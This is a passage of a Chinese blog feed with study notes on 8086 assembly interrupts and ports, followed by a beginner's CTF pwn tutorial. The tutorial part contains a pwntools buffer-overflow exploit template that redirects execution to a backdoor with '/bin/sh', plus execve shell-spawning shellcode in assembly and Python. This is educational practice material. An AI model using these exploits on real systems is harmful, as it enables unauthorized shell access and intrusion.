id="12-内中断"><a href="#12-内中断" class="headerlink" title="12. 内中断"></a>12. 内中断</h1><p>任何一个通用的CPU，可以在执行完当前正在执行的指令之后，检测到从CPU外部发送过来或内部产生的一种特殊信息，并且可以立即对所接收到的信息进行处理。中断的意思是CPU不再接着(刚执行完的指令)向下执行，而是转去处理这个特殊信息。</p><p>对于8086CPU，当内部有下面的情况发生的时候将产生相应的中断信息：</p><ol><li>除法错误，比如执行div指令产生的除法溢出    0</li><li>单步执行                                                               1</li><li>执行into指令                                                        4</li><li>执行int指令，该指令的格式为int n，指令中的n为字节型立即数，是提供给CPU的中断类型码</li></ol><h2 id="12-1-中断处理程序"><a href="#12-1-中断处理程序" class="headerlink" title="12.1 中断处理程序"></a>12.1 中断处理程序</h2><p>CPU收到中断信息后，应该转去执行该中断信息的处理程序。中断信息中包含有标识中断源的类型码，根据CPU的设计，中断类型码的作用就是用来定位中断处理程序。CPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址。中断向量表在0000:0000~0000:03FF的1024个单元存放着。在中断向量表中，一个表项占两个字，高地址字存放段地址，低地址字存放偏移地址。</p><h2 id="12-2-中断过程"><a href="#12-2-中断过程" class="headerlink" title="12.2 中断过程"></a>12.2 中断过程</h2><p>用中断类型码找到中断向量，并用它设置CS和IP，这个工作是由CPU的硬件自动完成的。CPU硬件完成这个工作的过程被称为中断过程。</p><p>中断过程：</p><ol><li>(从中断信息中)取得中断类型码N</li><li>标志寄存器的值入栈(因为在中断过程中要改变标志寄存器的值，所以先将其保存在栈中)  pushf</li><li>设置标志寄存器的第8位TF和第9位IF为0  TF=0，IF=0</li><li>CS的内容入栈   push CS</li><li>IP的内容入栈    push IP</li><li>从内存地址为中断类型码<em>4 和中断类型码\</em>4+2 的两个字单元中读取中断处理程序的入口地址设置IP和CS   (IP)=(N*4)，(CS)=(N*4+2)</li></ol><h2 id="12-3-中断处理程序和iret指令"><a href="#12-3-中断处理程序和iret指令" class="headerlink" title="12.3 中断处理程序和iret指令"></a>12.3 中断处理程序和iret指令</h2><p>中断处理程序的编写步骤：</p><ol><li>保存用到的寄存器</li><li>处理中断</li><li>恢复用到的寄存器</li><li>用iret指令返回</li></ol><p>iret指令的功能用汇编语法描述：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br><span class="line">pop CS</span><br><span class="line">popf</span><br></pre></td></tr></table></figure><p>iret指令执行后，CPU回到执行中断处理程序前的执行点继续执行程序。</p><h2 id="12-4-单步中断"><a href="#12-4-单步中断" class="headerlink" title="12.4 单步中断"></a>12.4 单步中断</h2><p>CPU在执行完一条指令后，如果检测到标志寄存器的TF=1，则产生单步中断，引发中断过程。</p><h1 id="13-int指令"><a href="#13-int指令" class="headerlink" title="13. int指令"></a>13. int指令</h1><p>int n也是内中断的一种。</p><h2 id="13-1-BIOS中断例程"><a href="#13-1-BIOS中断例程" class="headerlink" title="13.1 BIOS中断例程"></a>13.1 BIOS中断例程</h2><p>int 10h中断例程是BIOS提供的中断例程，其中包含了多个和屏幕输出相关的子程序。</p><p>(ah)=2表示调用第10h号中断例程的2号子程序，功能为设置光标位置。</p><p>(ah)=9表示调用第10h号中断例程的9号子程序，功能为在光标位置显示字符，可以提供要显示的字符、颜色属性、页号、字符重复个数作为参数。</p><p>bl中的颜色属性的格式如下：</p><div class="table-container"><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>BL</td><td>R</td><td>G</td><td>B</td><td>I</td><td>R</td><td>G</td><td>B</td></tr><tr><td>闪烁</td><td></td><td>4~6背景</td><td></td><td>高亮</td><td></td><td>0~2前景</td></tr></tbody></table></div><p>编程，在屏幕的5行12列显示3个红底高亮闪烁绿色的’a’。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ah,2;置光标</span><br><span class="line">mov bh,0;第0页</span><br><span class="line">mov dh,5;dh中放行号</span><br><span class="line">mov dl,12;dl中放列号</span><br><span class="line">int 10h</span><br><span class="line"></span><br><span class="line">mov ah,9;在光标位置显示字符</span><br><span class="line">mov al,&#x27;a&#x27;;字符</span><br><span class="line">mov bl,11001010b;颜色属性</span><br><span class="line">mov bh,0;第0页</span><br><span class="line">mov cx,3;字符重复个数</span><br><span class="line">int 10h</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="13-2-DOS中断例程"><a href="#13-2-DOS中断例程" class="headerlink" title="13.2 DOS中断例程"></a>13.2 DOS中断例程</h2><p>int 21h中断例程是DOS提供的中断例程，其中包含了DOS提供给程序员在编程时调用的子程序。</p><p>前面一直使用的是int 21h中断例程的4ch号功能，即程序返回功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ah,4ch;程序返回</span><br><span class="line">mov al,0;返回值</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure><p>(ah)=9表示调用第21h号中断例程的9号子程序，功能为在光标位置显示字符串，可以提供要显示字符串的地址作为参数。</p><p>编程，在屏幕的5行12列显示字符串“Welcome to masm!”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data</span><br><span class="line">data segment</span><br><span class="line">db &#x27;Welcome to masm!&#x27;</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">start:mov ah,2;置光标</span><br><span class="line">mov bh,0;第0页</span><br><span class="line">mov dh,5;dh中放行号</span><br><span class="line">mov dl,12;dl中放列号</span><br><span class="line">int 10h</span><br><span class="line"></span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov dx,0;ds:dx指向字符串的首地址data:0</span><br><span class="line">mov ah,9</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h1 id="14-端口"><a href="#14-端口" class="headerlink" title="14. 端口"></a>14. 端口</h1><p>在PC机系统中，和CPU通过总线相连的芯片除各种存储器外，还有以下三种芯片</p><ol><li>各种接口卡(网卡、显卡)上的接口芯片，它们控制接口卡进行工作</li><li>主板上的接口芯片，CPU通过它们对部分外设进行访问</li><li>其他芯片，用来存储相关的系统信息，或进行相关的出入输出处理</li></ol><p>从CPU的角度，将寄存器都当作端口，对它们进行统一编址，从而建立了一个统一的端口地址空间。每一个端口在地址空间中都有一个地址。</p><p>CPU可以直接读写以下3个地方的数据：</p><ol><li>CPU内部的寄存器</li><li>内存单元</li><li>端口</li></ol><h2 id="14-1-端口的读写"><a href="#14-1-端口的读写" class="headerlink" title="14.1 端口的读写"></a>14.1 端口的读写</h2><p>因为端口所在的芯片和CPU通过总线相连，所以端口地址和内存地址一样，通过地址总线来传送。在PC系统中，CPU最多可以定位64KB个不同的端口，端口地址的范围为0~65535</p><p>端口的读写指令只有两条：in和out，分别用于从端口读取数据和往端口写入数据。</p><p><strong>访问内存：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,ds:[8];假设执行前(ds)=0</span><br></pre></td></tr></table></figure><p>①CPU通过地址线将地址信息8发出</p><p>②CPU通过控制线发出内存读命令，选中存储器芯片并通知它将要从中读取数据</p><p>③存储器将8号单元中的数据通过数据线送入CPU</p><p><strong>访问端口：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in al,60h;从60h号端口读入一个字节</span><br></pre></td></tr></table></figure><p>①CPU通过地址线将地址信息60h发出</p><p>②CPU通过控制线发出端口读命令，选中端口所在的芯片，并通知它将要从中读取数据</p><p>③端口所在的芯片将60h端口中的数据通过数据线送入CPU</p><p>注：在in和out指令中，只能使用ax或al来存放从端口中读入的数据或要发送到端口中的数据。访问8位端口时用al，访问16位时用ax。</p><p>对0~255以内的端口进行读写时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">in al,20h;从20h端口读入一个字节</span><br><span class="line">out 20h,al;往20h端口写入一个字节</span><br></pre></td></tr></table></figure><p>对256~65535的端口进行读写时，端口号放在dx中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov dx,3f8h;将端口号3f8h送入dx</span><br><span class="line">in al,dx;从3f8h端口读入一个字节</span><br><span class="line">out dx,al;往3f8h端口写入一个字节</span><br></pre></td></tr></table></figure><h2 id="14-2-shl和shr指令"><a href="#14-2-shl和shr指令" class="headerlink" title="14.2 shl和shr指令"></a>14.2 shl和shr指令</h2><p>shl和shr是逻辑移位指令。</p><p>shl是逻辑左移指令，它的功能为：</p><ul><li>将一个寄存器或内存单元中的数据向左移位</li><li>将最后移出的一位写入CF中</li><li>最低位用0补充</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,01001000b</span><br><span class="line">shl al,1;将al中的数据左移一位</span><br></pre></td></tr></table></figure><p>执行后(al)=10010000b，CF=0</p><p>shr是逻辑右移指令：</p><ul><li>将一个寄存器或内存单元中的数据向右移位</li><li>将最后移出的一位写入CF中</li><li>最高位用0补充</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,10000001b</span><br><span class="line">shr al,1</span><br></pre></td></tr></table></figure><p>执行后(al)=01000000b，CF=1</p><h2 id="14-3-CMOS-RAM芯片"><a href="#14-3-CMOS-RAM芯片" class="headerlink" title="14.3 CMOS RAM芯片"></a>14.3 CMOS RAM芯片</h2><p>CMOS特征：</p><ol><li>包含一个实时钟和一个有128个存储单元的RAM存储器</li><li>该芯片靠电池供电，关机后其内部的实时钟仍可正常工作，RAM中的信息不丢失</li><li>128个字节的RAM中，内部实时钟占用0~0dh单元来保存时间信息，其余大部分单元用于保存系统配置信息，供系统启动时BIOS程序读取。</li><li>芯片内部有两个端口，端口地址为70h和71h。CPU通过这两个端口读写CMOS</li><li>70h为地址端口，存放要访问的CMOS RAM单元的地址；71h为数据端口，存放从选定的CMOS单元中读取的数据，或要写入到其中的数据。CPU对CMOS的读写分两步进行，读CMOS的2号单元：①将2送入端口70h；②从端口71h读出2号单元的内容</li></ol><p>在CMOS中，存放这当前的时间：年、月、日、时、分、秒。这6个信息的长度都为1个字节。存放单元为：秒：0        分：2        时：4        日：7        月：8        年：9</p><p>这些数据以BCD码的方式存放。BCD码是以4位二进制数表示十进制数码的编码方法。数值26，用BCD码表示为：0010 0110</p><p>1个字节表示2个BCD码，高4位的BCD码表示十位，低4位的BCD码表示个位。</p><p>编程，在屏幕中间显示当前的月份</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:mov al,8</span><br><span class="line">out 70h,al;从8号单元读出当前月份的BCD码</span><br><span class="line">in al,71h;从数据端口71h中取得指定单元中的数据</span><br><span class="line"></span><br><span class="line">mov ah,al;al中为从CMOS的8号单元中读出的数据</span><br><span class="line">mov cl,4</span><br><span class="line">shr ah,cl;ah中为月份的十位数码值</span><br><span class="line">and al,00001111b;al中为月份的个位数码值</span><br><span class="line"></span><br><span class="line">add ah,30h</span><br><span class="line">add al,30h;显示对应的ASCII码字符</span><br><span class="line"></span><br><span class="line">mov bx,0b800h</span><br><span class="line">mov es,bx</span><br><span class="line">mov byte ptr es:[160*12+40*2],ah;显示月份的十位数码</span><br><span class="line">mov byte ptr es:[160*12+40*2+2],al;显示月份的个位数码</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h1 id="15-外中断"><a href="#15-外中断" class="headerlink" title="15. 外中断"></a>15. 外中断</h1><p>外设输入不直接送入内存和CPU，而是送入相关的接口芯片的端口中；CPU向外设的输出也不是直接送入外设，而是先送入端口中，再由相关芯片送到外设。</p><p>在PC系统中，外中断源一共有以下两类：</p><ol><li>可屏蔽中断</li></ol><p>可屏蔽中断是CPU可以不响应的外中断。CPU是否响应要看标志寄存器的IF位。如果IF=1，CPU在执行完当前指令后响应中断，引发中断过程；如果IF=0，不响应可屏蔽中断。</p><p>8086CPU提供设置IF的指令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sti;设置IF=1</span><br><span class="line">cli;设置IF=0</span><br></pre></td></tr></table></figure><ol><li>不可屏蔽中断</li></ol><p>不可屏蔽中断是CPU必须响应的外中断。当CPU检测到不可屏蔽中断信息时，则在执行完当前指令后，立即响应，引发中断过程。对于8086CPU，不可屏蔽中断的中断类型码固定为2，所以中断过程中，不需要取中断类型码。则不可屏蔽中断的中断过程为：</p><p>①标志寄存器入栈，IF=0，TF=0</p><p>②CS、IP入栈</p><p>③(IP)=8，(CS)=(0ah)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;很久之前看王爽老师的《汇编语言》写的笔记，可能不太准确，先做个存档吧。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="汇编" scheme="http://example.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>pwn基础入门</title>
    <link href="http://example.com/posts/1c971db4.html"/>
    <id>http://example.com/posts/1c971db4.html</id>
    <published>2022-04-10T06:27:13.698Z</published>
    <updated>2022-04-11T05:24:58.920Z</updated>
    
    <content type="html"><![CDATA[<p>先存个档。</p><span id="more"></span><h1 id="1-Linux入门"><a href="#1-Linux入门" class="headerlink" title="1. Linux入门"></a>1. Linux入门</h1><div class="table-container"><table><thead><tr><th>命令</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td>pwd</td><td>输出当前路径</td><td>pwd</td></tr><tr><td>ls</td><td>列出位于当前路径的文件</td><td>ls -al</td></tr><tr><td>cd xxx</td><td>改变当前路径，前往xxx目录</td><td>cd ~/workspace</td></tr><tr><td>cat xxx</td><td>直接展示xxx文件的内容</td><td>cat hw.c</td></tr><tr><td><em>*</em> \</td><td>grep xxx</td><td><em>*</em>是其他命令，输出含有xxx的行</td><td>cat hw.c \</td><td>grep stdio.h</td></tr><tr><td><em>*</em> \</td><td>less</td><td>查看输出更舒服，jk上下移动q退出</td><td>cat hw.c \</td><td>less</td></tr><tr><td>./xxx</td><td>运行当前目录xxx可执行文件</td><td>./a.out</td></tr></tbody></table></div><h1 id="2-汇编基础"><a href="#2-汇编基础" class="headerlink" title="2. 汇编基础"></a>2. 汇编基础</h1><p> 内存地址：在有段/偏移寄存器的语境下一般记为<code>段:偏移</code>，如<code>CS:IP</code>,<code>SS:IP</code>,<code>SS:BP</code>,<code>DS:DI</code>,<code>DS:SI</code>,<code>DS:[]</code></p><script type="math/tex; mode=display">一个内存地址=段地址×16+偏移地址\\1234h:ABCDh=12340h+ABCDh=1CF0Dh</script><p>小端序：低地址存放低位数据</p><p>一个程序的内存空间：</p><div class="table-container"><table><thead><tr><th>高地址</th><th style="text-align:center">OS Kernel Space</th></tr></thead><tbody><tr><td></td><td style="text-align:center">Stack</td></tr><tr><td></td><td style="text-align:center">↓(blank)</td></tr><tr><td></td><td style="text-align:center">Shared Libraries</td></tr><tr><td></td><td style="text-align:center">↑(blank)</td></tr><tr><td></td><td style="text-align:center">Heap</td></tr><tr><td></td><td style="text-align:center">BSS</td></tr><tr><td></td><td style="text-align:center">Data(RW)数据段</td></tr><tr><td></td><td style="text-align:center">Text(RX)代码段</td></tr><tr><td>低地址</td><td style="text-align:center">(blank)</td></tr></tbody></table></div><p>栈：</p><div class="table-container"><table><thead><tr><th style="text-align:center">SS:SP 栈顶</th></tr></thead><tbody><tr><td style="text-align:center">SS:BP 栈帧基底</td></tr><tr><td style="text-align:center">SS 栈底</td></tr></tbody></table></div><p>寄存器总结</p><div class="table-container"><table><thead><tr><th>name</th><th>用途</th><th>name</th><th>用途</th></tr></thead><tbody><tr><td>AX</td><td>通常用来存放函数的返回值</td><td>SS(Stack Seg)</td><td>栈的段地址/基地址</td></tr><tr><td>CX</td><td>通常用来做循环计数器</td><td>CS(Code Seg)</td><td>下一条指令的段地址</td></tr><tr><td>BX</td><td></td><td>DS(Data Seg)</td><td>数据的段地址</td></tr><tr><td>DX</td><td></td><td><strong>SP(Stack Pointer)</strong></td><td>栈顶偏移地址</td></tr><tr><td></td><td></td><td><strong>BP(Base Pointer)</strong></td><td>栈的基址偏移地址</td></tr><tr><td></td><td></td><td><strong>IP(Instruction Pointer)</strong></td><td>下一条指令的偏移地址</td></tr></tbody></table></div><p>汇编指令</p><p><img src="F:\markdown图片\pwn知识点\汇编指令.png" alt="汇编指令"></p><h1 id="3-程序装载与栈帧结构"><a href="#3-程序装载与栈帧结构" class="headerlink" title="3. 程序装载与栈帧结构"></a>3. 程序装载与栈帧结构</h1><p>在Linux的可执行文件ELF</p><p>ELF文件类型：</p><ul><li>Relocatable File(*.o)：可重定位文件，用来链接的素材</li><li>Executable File(*)：可执行文件</li><li>Shared Object File(*.so)：共享目标文件，用于做动态链接库</li></ul><h1 id="4-实战环境配置和工具介绍"><a href="#4-实战环境配置和工具介绍" class="headerlink" title="4. 实战环境配置和工具介绍"></a>4. 实战环境配置和工具介绍</h1><p>连接远程服务器：</p><p>nc表示netcat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc node4.buuoj.cn 28487</span><br></pre></td></tr></table></figure><p>使用file查看文件信息，checksec查看文件保护信息。</p><img src="/posts/1c971db4/checksec.png" class="" title="文件信息"><p>利用gdb调试ELF文件：</p><div class="table-container"><table><thead><tr><th>命令</th><th>简写</th><th>说明</th></tr></thead><tbody><tr><td>file</td><td></td><td>装载一个文件，可以在gdb后加参数，效果等同</td></tr><tr><td>kill</td><td></td><td>终止当前调试的进程</td></tr><tr><td>run</td><td>r</td><td>运行当前装载的文件，运行过程中使用Ctrl + C退出程序交互，进入调试(在退出时位置)</td></tr><tr><td>next</td><td>n</td><td>=step over 单步步过</td></tr><tr><td>step</td><td>s</td><td>=step into 单步步入</td></tr><tr><td>continue</td><td>c</td><td>继续执行程序，直到下一个中断或程序结束</td></tr><tr><td>finish</td><td>fini</td><td>运行到函数返回处</td></tr><tr><td>catch</td><td></td><td>设置捕捉点</td></tr><tr><td>thread</td><td>t</td><td>查看当前程序的线程信息</td></tr><tr><td>break</td><td>b</td><td>在当前位置设置断点</td></tr><tr><td>backtrace</td><td>k</td><td>查看当前函数调用栈信息</td></tr><tr><td>stack</td><td></td><td>stack n 查看栈内容</td></tr><tr><td>vmmap</td><td></td><td>查看程序中的分段，相当于OD中的<code>E</code>模块</td></tr></tbody></table></div><h1 id="5-缓冲区溢出"><a href="#5-缓冲区溢出" class="headerlink" title="5. 缓冲区溢出"></a>5. 缓冲区溢出</h1><p>编写程序时没有考虑或错误设置用户输入长度，导致用户向缓冲区输入长度超过接受变量长度，从而覆盖到其它正常数据，破坏栈帧结构。</p><p>缓冲区溢出常见的漏洞函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> handle, <span class="type">void</span> *buf, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">scanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getchar</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> format, ...)</span>;</span><br></pre></td></tr></table></figure><p>如果文件中有”/bin/sh”，可用以下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    z(<span class="string">&#x27;b foo&#x27;</span>)<span class="comment">#在foo函数下断</span></span><br><span class="line">    <span class="comment"># 如果直到backdoor和binsh的地址可直接写地址</span></span><br><span class="line">    <span class="comment"># backdoor = 0x08049172</span></span><br><span class="line">    <span class="comment"># bin_sh = 0x0804A008</span></span><br><span class="line">    backdoor = e.symbols[<span class="string">&#x27;backdoor&#x27;</span>]<span class="comment">#参数为函数名字</span></span><br><span class="line">    bin_sh = <span class="built_in">next</span>(e.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment">#在ELF文件中找/bin/sh</span></span><br><span class="line">    main_addr = e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1c</span> + p32(backdoor) + p32(main_addr) + p32(bin_sh)<span class="comment"># 即执行完backdoor函数后返回到main函数</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h1 id="6-Shellcode"><a href="#6-Shellcode" class="headerlink" title="6. Shellcode"></a>6. Shellcode</h1><p>shellcode就是能使程序调用shell的一段代码(通常为汇编级别/机器码)。一旦某种shellcode被执行，我们就能够拿到目标机器的控制权限，从而获取flag。</p><ul><li>system(“/bin/sh”);（？） -&gt; execve(“/bin/sh”, 0, 0)</li><li>触发中断(int 0x80 / syscall)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">; first.asm</span><br><span class="line">; first get shell test in pwn class</span><br><span class="line">; nasm -f elf32 first.asm</span><br><span class="line">; ld -m elf_i386 -o getShell first.o</span><br><span class="line">; objump -d getShell</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">push &quot;/sh&quot;</span><br><span class="line">push &quot;/bin&quot;</span><br><span class="line">mov ebx, esp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor ecx, ecx</span><br><span class="line">mov al, 0xb</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>Shellcode脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">    payload1 = asm(shellcraft.sh())</span><br><span class="line">    My_Shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload2 = asm(My_Shellcode)</span><br><span class="line">    p = process(<span 